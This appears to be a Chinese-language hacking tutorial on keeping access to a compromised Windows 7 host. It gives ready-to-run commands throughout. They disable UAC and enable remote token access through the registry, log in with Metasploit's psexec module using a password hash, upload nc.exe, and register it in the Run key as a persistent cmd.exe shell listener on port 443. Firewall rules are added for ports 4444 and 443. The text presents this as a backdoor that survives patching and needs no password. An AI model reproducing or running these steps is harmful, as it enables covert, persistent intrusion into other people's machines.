0x00 紧接第二期

当你获得了win7的权限之后，你是不是想....

懂得都懂

现在我提供一下我的idea

0x01 基本思路

通过hash算法来进行登入

为什么要制造x门，是为了当x软件更新后，这个漏洞修补了，你任有机会进入这个系统中

0x02 进行实践

代码解释

netsh advfirewall firewall add rule name="theshy" protocol=TCP dir=out remoteport=4444 action=allow


remoteport=4444 action=allow:允许4444端口开启

firewall add rule name= xxx: 添加用户为xxx

以下代码是为了解决电脑程序自带的问题：

cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Polices\System /v EnableLUA /t REG_DWORD /d 0 /f

参数说明
ADD 添加一个注册表项
-v 创建键值
-t 键值类型
-d 键值的值
-f 强制修改注册表项

用于强制关闭UAC（类似于弹窗警告

cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

用于开启共享，因为psexec属于远程操作语句，执行前提是该主机开启了共享

成功之后退出，然后执行该语句
exploit/windows/smb/psexec

进行查看：

注意

RHOST ,SMBUSER,PASSWORD,SMBDOMAIN 这些数值进行修改

tips: password改成哈希码，SMBDOMAIN没有特殊情况的话一般改为workgroup

然后进行登入

0x03 开始创建X门~

upload  /usr/share/windows-binaries/nc.exe C://
注册表添加启动项执行nc反弹shell命令
>reg setval -k 
HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 
'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'

nc 参数解释：
L 表示用户退出连接后重新进行端口侦听
d 后台运行
p 指定端口
-e prog 程序重定向，一旦连接，就执行

netsh advfirewall firewall add rule name= "theshy443" protocol=TCP dir =in localport=443 action=allow

用于确保防火墙允许443端口进入

然后重启，使其命令生效

然后通过nc 直接连上目标机

在登入的时候发现，并没有使用到任何的密码和账号，从而达到了植入x门的作用!
